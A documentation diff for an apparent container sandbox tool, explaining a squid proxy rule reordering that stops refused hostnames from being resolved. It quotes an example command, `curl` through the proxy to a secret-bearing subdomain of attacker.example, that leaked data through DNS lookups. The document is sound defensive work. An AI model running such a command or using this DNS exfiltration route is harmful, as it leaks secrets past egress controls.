@@ -309,10 +309,23 @@ To change any embedded file, edit the corresponding heredoc inside `nixenv.sh`.
   stale config). Squid's access log is host-visible at
   `~/.nixenv/proxy/data/egress.log`; `egress <p> [-f]` summarises allowed vs
   `TCP_DENIED` domains (filtered by the project's subnet). `delete` also removes
-  the internal network (disconnecting the proxy first). Known limits: squid's ACLs filter
-  traffic, not name lookups, so a reachable resolver would still answer for a
-  denied host; UDP/QUIC isn't proxied; and the one-time `clone_repo` runs
-  unrestricted (default bridge). Note what this looks like from INSIDE a
+  the internal network (disconnecting the proxy first). **Refused names must never be
+  resolved (SEC-05).** squid stops at the first matching `http_access` rule and
+  ANDs a rule's ACLs left to right, and a `dst` ACL resolves the hostname — so
+  the old order (`deny to_localnets` first) looked up EVERY requested name, and
+  `curl -x proxy http://<secret>.attacker.example/` exfiltrated through DNS
+  despite `TCP_DENIED`. The generated order is: `deny !nixenv_projects` (src) →
+  `deny CONNECT !Connect_ports` → per-project name gate `deny p_X !d_X` →
+  `deny to_localnets` (the only `dst`, reached only by allowed names) → allows →
+  `deny all`. Names and IPs share ONE `dstdomain -n` list per project; `-n` stops
+  the reverse lookup of IP-literal URLs, and there is deliberately no per-project
+  `dst` ACL — so an allowed IP matches requests addressed to it literally, not
+  hostnames resolving to it (that would need the lookup). `unit/08` checks the
+  order textually AND behaviourally through `tests/squid_acl_sim.py`, a small
+  model of squid's evaluation that reports whether a lookup would happen;
+  `integration/07` runs `squid -k parse` on the real config. Other known limits:
+  UDP/QUIC isn't proxied; and the one-time `clone_repo` runs unrestricted
+  (default bridge). Note what this looks like from INSIDE a
   restricted container: the internal network has no route out, so EXTERNAL name
   resolution fails outright — `ping google.com` → "Temporary failure in name
   resolution", and `ping`/`dig`/`nc`/QUIC can never work, since only
